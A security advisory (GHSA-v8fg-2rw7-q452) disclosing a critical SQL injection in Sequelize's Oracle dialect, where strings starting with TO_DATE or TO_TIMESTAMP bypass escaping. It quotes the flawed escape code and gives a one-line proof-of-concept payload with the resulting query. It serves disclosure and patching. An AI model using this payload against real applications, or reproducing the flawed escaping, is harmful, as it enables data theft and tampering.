# [C] Sequelize: SQL Injection (Oracle DB)

## Summary
Severity: Critical
Advisory: GHSA-v8fg-2rw7-q452
CVE: CVE-2026-69240
CWE: CWE-89
Ecosystem: npm
CVSS: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H (CVSS_V3)
Published: 2026-08-03
Source: https://github.com/advisories/GHSA-v8fg-2rw7-q452
Type: github-advisory

## Affected
- npm: `sequelize` — affected >=0 <6.37.4

## Details
### Summary
SQL Injection is possible with strings only **if dialect is set to `oracle`**.
The vulnerability was confirmed on Sequelize v6.37.3.

### Details
The `escape` function defined in `sql-string.js` does not escape quotes if the value starts with `TO_TIMESTAMP` or `TO_DATE`.

```javascript
  } else if (dialect === 'oracle' && typeof val === 'string') {
    if (val.startsWith('TO_TIMESTAMP') || val.startsWith('TO_DATE')) {
      return val;
    }
    val = val.replace(/'/g, "''");
  }
```

### PoC
Suppose the application has the following code:

```javascript
  var result = await models.Student.findOne({
    where: {
      firstName: req.query.firstName
    }
  });
```

An attacker can inject arbitrary sql expressions.

`http://host/path?firstName=TO_DATE('0','Y')||'' OR 1=1--`

The resulted SQL will be:

```SQL
SELECT ... WHERE "Student"."firstName" = TO_DATE('0','Y')||'' OR 1=1-- ORDER BY "Student"."id" OFFSET 0 ROWS FETCH NEXT 1 ROWS ONLY;
```

### Impact
Data theft and tampering.

## References
- https://github.com/sequelize/sequelize/security/advisories/GHSA-v8fg-2rw7-q452
- https://github.com/sequelize/sequelize/commit/5deadd2410ae9136a21fb652db206d27bb715f26
- https://github.com/sequelize/sequelize
- https://github.com/sequelize/sequelize/releases/tag/v6.37.4
